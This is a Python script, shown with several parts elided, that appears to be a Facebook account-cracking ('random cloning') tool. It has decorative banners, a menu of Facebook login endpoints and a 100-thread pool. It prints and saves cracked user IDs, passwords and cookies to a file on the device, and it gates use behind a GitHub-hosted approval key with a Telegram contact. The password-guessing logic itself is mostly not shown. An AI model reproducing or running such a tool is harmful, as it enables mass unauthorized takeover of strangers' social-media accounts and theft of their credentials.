...
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                           ___   _   _ _____ _____ _   _ 
 ...
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |  
| |      __      | || |     _____    | || | ____    ____ | || |     _____    | || |  _______     | |  
| |     /  \     | || |    |_   _|   | || ||_   \  /   _|| || |    |_   _|   | || | |_   __ \    | |  
| |    / /\ \    | || |      | |     | || |  |   \/   |  | || |      | |     | || |   | |__) |   | |  
| |   / ____ \   | || |   _  | |     | || |  | |\  /| |  | || |      | |     | || |   |  __ /    | |  
| | _/ /    \ \_ | || |  | |_' |     | || | _| |_\/_| |_ | || |     _| |_    | || |  _| |  \ \_  | |  
| ||____|  |____|| || |  `.___.'     | || ||_____||_____|| || |    |_____|   | || | |____| |___| | |  
| |              | || |              | || |              | || |              | || |              | |  
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |  
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR  :                  Ajmir Hossain ]      ║\033[1;31m 
╠══[FACEBOOK :                  Ajmir Hossain     ║  \033[1;97m  
╠══[GITHUB    :                  \33[1;38mAK-40    ║\33[1;34m   
╠══[REGIONAL :                   BANGLADESH    ║\33[1;35m 
╠══[TOOLS     : FREE BUT APPROVAL NEED.║ \33[1;32m   
...
def sykology():
    ...
    for z in range(ehc_lim):
        ...
        Dark.append(co)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m✮⃝𝑾𝑶𝑹𝑲=𝐀𝐉(𝐀𝐉𝐌𝐈𝐑)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[BLACK] Update  M")
    print(" \033[38;5;46m[BLACK] Update Mbasic")
    print(" \033[38;5;46m[BLACK] Update Free")
    print(" \033[38;5;46m[BLACK] Update P")
    print(" \033[38;5;46m[BLACK] Update  X")
    print(" \033[38;5;46m[BLACK] Update Touch") 
    print(" \033[38;5;46m=============================")
    line()
    ...
    if gxd in ["DTT1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["BL2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["BL3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["BL4","P"]:
        fb="p"
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(Dark))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mDX-Ajmir-ok.txt") 
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mDX Ajmir\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1mLogin❴\033[38;5;46mLITE+APK❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mDX Ajmir\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     DX Ajmir Hossain FACEBOOK\033[38;5;46m❴NUMBER❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     DX Ajmir Hossain FACEBOOK\033[38;5;46m❴PASS❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/DX-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
...
def approval():
	...
	key = "9".join(uuid)
	a=requests.get("https://github.com/AK-40/Random-cloning-again-update/blob/main/Approval.txt").text
	if key in a:
		sykology()
	else:
		...
		os.system('espeak -a 300 " FOR APPROVAL CONTACT ADMIN"')
		print("Your key : "+frist+-last+key)
		print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		os.system("xdg-open https://t.me/+8801813225678")
approval()
